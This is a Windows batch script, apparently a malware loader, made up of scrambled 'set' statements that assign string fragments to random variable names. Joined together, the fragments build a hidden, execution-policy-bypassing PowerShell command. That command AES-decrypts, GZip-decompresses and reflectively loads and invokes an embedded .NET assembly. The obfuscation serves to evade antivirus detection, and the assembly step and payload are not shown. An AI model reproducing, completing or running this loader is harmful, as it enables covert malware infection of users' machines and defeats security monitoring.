@echo off
set "OWJRzbrNhp=.e"
set "PNEEsEiCus=ws"
set "lffbVysWxz=y "
set "KShAbYXPQB=32"
set "JhsHSuEFxp=ll"
set "inahKFkwtJ=Wi"
set "bAwLewVbJU=po"
set "QQcaCyXecW=in"
set "MtKZzxiAds=xe"
set "FEwVOzavfK=Sy"
set "kKYvgQUhvT=py"
set "XLdKalieRh=do"
set "ugHsSRCosv=em"
set "eNilRFHCPj= /"
set "MZjIEPKCrK=rs"
set "JkbdPVbJxG=nd"
set "QRIMLtliBW=s\"
set "ubgogWbLaW=ll"
set "dqFSfNDvgB=st"
set "DuKEbilePb=ow"
set "aTMTDwModM=we"
set "iPYeXAmQHY=\W"
set "KbzUGeZcyI=:\"
set "zXyDzbBebB=we"
set "HlqlCQbQFx= C"
set "vbOXAhWOWQ=he"
set "FLHtETQhYC=Po"
set "STzIaxMhkB=\v"
set "grVawEkpcL=co"
set "qvKKrleJfh=he"
set "HtzbmFjbBs=1."
set "scjWrqbKtm=0\"
set "rhZzjclxHX=rS"
set "aXCoUlqyLe=cd"
set "uDaWcmQjql= %~dp0"
set "oqpEGKqiCx= [Sy"
set "VPtwUiWBac=T.Pa"
set "ODqPFEkkHD=ojgT"
set "VFkKDmrQdf=e = "
set "vRqjMVvMFg=ddin"
set "qOOpSOCfuc=tem."
set "fXhkOadHXP=stem"
set "zUDKDStQTc=rtS4"
set "PvpfwOTLyr=C.Su"
set "ByHNyShgpk=6esa"
set "tpIgyaCUWP=ert]"
set "qyPWOKnUZt=m, 0"
set "eaGGHmzWsD=wrN."
set "KyZKztZneX=-nop"
set "kDfDdAIDOp='gni"
set "rFLWhDUbPD=Szz "
set "ewUPnLuuyQ=[Sys"
set "CLyGKuoXFl=]::("
set "ECdTsziCLl=.Cop"
set "sBnDTRRVDy=16] "
set "KLnSriMCiK=pres"
set "ZxsjdgiLwk=736u"
set "ERphlQCdtN=;$Ds"
set "lKllpPdxwH=e]::"
set "PCxwlIGHzW=rity"
set "bZeiJRcPgE=tDcT"
set "VsdCBOEYhl=O.Me"
set "DiQdTISgFy=t Sy"
set "ulpElhqEXO=m(, "
set "ngoaUNvXzl=.Key"
set "QzgwFvXUyP=Secu"
set "WXbQhfaLKY=$aTp"
set "OdCckJguaE= = $"
set "mXzzVyjEPY=and "
set "DoMhoUzACx=ojgT"
set "uGPuWQZZSf=.Sec"
set "alMVGIYqPI=New-"
set "GyYLNqGOco=ptog"
set "WxlsuBtsTy= = $"
set "XdwJznZFGN=($Hh"
set "EgCdGLlZZR=0O+g"
set "qCiPQZJOLD=daeR"
set "WMaJLrmyEF=sGUc"
set "dKjOckUVBQ=.Cry"
set "lTbxdPRPcO=);$D"
set "gDjEhFeQTX=Mode"
set "NIZZDvnTVc===')"
set "ZCYLNTGzYI=m = "
set "yQRuksnqyS=DcTU"
set "FTCInmwPuC=[IO."
set "FOPgwheYlh=-Obj"
set "dBWJSGlNEF=Comp"
set "ERoaPbTdzm=ojgT"
set "BEFTOREPPt=oArr"
set "pEVCYXjhKN=UGTu"
set "jFEEPiNwkn=Obje"
set "GASQeUFmOs=pher"
set "OFIHLqkSWh=ZYYc"
set "HBApJwkpgJ=ct S"
set "CmWfJatCgg=hy.A"
set "PPhfnqRAWx=ptor"
set "FGKEeHuJXr=).Sp"
set "wIcHhfiZnR=Bmor"
set "fgydPwOniS=bypa"
set "BZqzudCtQj=morF"
set "uggOwZeVcR=ment"
set "zZnPNvzmcm= [Sy"
set "clkGuqdJSz=.GZi"
set "JfmWefuvQm=pStr"
set "YvgjwSxrWK= = N"
set "ufUUDtyMyg= if "
set "AHpZnBAjEW=trea"
set "VDJIwcAcZR=3HWs"
set "eXHdhKdcwi=m.IO"
set "KcauDEgtkI=rity"
set "VQXoQYCaNc=Vm.T"
set "xWfNRUauBY=New-"
set "dXikewplul=Fina"
set "JTzREhvSGY=[Sys"
set "PvVIfwTWbz=brea"
set "eaAlqntZhc=, $K"
set "gKYWwkmGtS=);$w"
set "EMXPioggte=ress"
set "FSpoWmJzQk=Tw ="
set "zdTSNDBOBn=($Hh"
set "qBRktQbnCa=]::("
set "XWTQPWkqcU=Invo"
set "mmUMoVOmsy=oL'["
set "gZCyETzdSE=ode]"
set "zhnMGxnLMX=ct S"
set "mUVbbmgAVI=m.Re"
set "RnFvOWOiPg=wXw."
set "FbDiRcJsAR=AueO"
set "tjBrEIFwWM=]::N"
set "noKmEQaCmm=onve"
set "tNkOMujqST=am;$"
set "oKbCghmLrU= '')"
set "NmStIFYmtr=Syst"
set "rvsOsaTQtY=yTo("
set "WnAPnJljxh=7;$l"
set "SRwdlrlLhN=ay()"
set "PKNFJKusrM=File"
set "MGHYDsNwFv=3); "
set "BVcrrlzSLh=ew-O"
set "AyuXHYGEwD=Secu"
set "wAThCUrfLG=.Cry"
set "FIHFuPXgQe=le  "
set "QvqJSaFnuN=y.Ci"
set "BbtHjqELIV=ddin"
set "UWxjrcAqzq=.Ass"
set "qDCnSRwKhQ=ke($"
set "orXjiWvPeu=.Com"
set "gGyCayDyRa=rofi"
set "iAUMaizgCe=pDZz"
set "WBRDBiazvp='')("
set "HzRzYetueE=g = "
set "TyDrQcyNVF=]::C"
set "VvmNHElHbz=('l0"
set "NOSJrCDOTC=Conv"
set "CVlMVGwClV=.Dis"
set "HcUysyAHxb=$cxw"
set "pGDCqbyZjA=th('"
set "hGBWwbgHQS=tS46"
set "fyGliZpluR=N = "
set "JMRtGOHJcC=tryP"
set "RhpCouaQck=KXcH"
set "NKBzgKQiWN=KXcH"
set "SBeRTuJFzA=oin "
set "fUHQDXtvgc=ypto"
set "YXBsePDfin=v4Ir"
set "WwDLNSVMAZ=ress"
set "umDSJLNfXU=oryS"
set "XsHVLcLXNu=qjC."
set "RtRMlqwisW=ose("
set "lSnbfkfUYx=se()"
set "PLHubAMLcA=tion"
set "OIyGCwSDOK=+hAO"
set "dwFWYhyVws=tem."
set "MZiAVcRCZh=n ''"
set "XLArwlHffC=;$cx"
set "NvIAcjFdXR='dqR"
set "LMuOGPNUwz=$KXc"
set "XXeCIeBBOQ=Hm);"
set "XTXucCUpig=embl"
set "uCACmyruMu=();$"
set "SsFnyWCLGB=qjC "
set "OpptbMkqiT=gth)"
set "vOolYWyFZQ=Hhqj"
set "dRzDihEJDO=:('g"
set "nwevwZosUF=sion"
set "nMFPnXMeoL=Disp"
set "JuCbZGHXcc=-joi"
set "zYUrjyiajv=bstr"
set "HbTbwfUqrP=yste"
set "tSUVSbbxhJ=);$t"
set "FliwZaXFYt=BC;$"
set "XSaVhPvkxf=lit("
set "KRPpzvPBCV=$wUd"
set "anoxmHXHas=peb."
set "cvnjyQZAUz=em.C"
set "QidsUStidV=-joi"
set "UzZgEIbDxt=::('"
set "ckdAXGtbLQ=em.I"
set "hwdTkYaGus=.Len"
set "rjWxzhVTGm='txe"
set "UbzONkoDjv=n ''"
set "yMQHwUmXXU=join"
set "mtEAZGjUvX=Disp"
set "wjWDRMCudl=flec"
set "InDrrLyFak=vert"
set "LZygwwPhdx=saBm"
set "DTaoZhKExV=Syst"
set "HbnfYWOBso=tem."
set "rQPumRmCNj=eam("
set "ovUDYQZyvO=fore"
set "iatokXRBwZ=ach "
set "wDFJksNVLO=in $"
set "QAchdaFVUA== $l"
set "dVQKKwXgGB=F'[-"
set "lEqpKhTAPi=null"
set "QMkIJQRLCQ=[Sys"
set "LlMXlMAaUt=tsWi"
set "glBPtcowLL=cxwr"
set "BRfOjipbCs=6] -"
set "edKJbhkirr=rN, "
set "SlDsJLVzCt=stem"
set "CLcterdCgs=  $x"
set "KhuvYtHlCI=.IO."
set "AiwhqrpwTX=bjec"
set "cRElcgxwNB=gMod"
set "jPVczCHmQT=)($x"
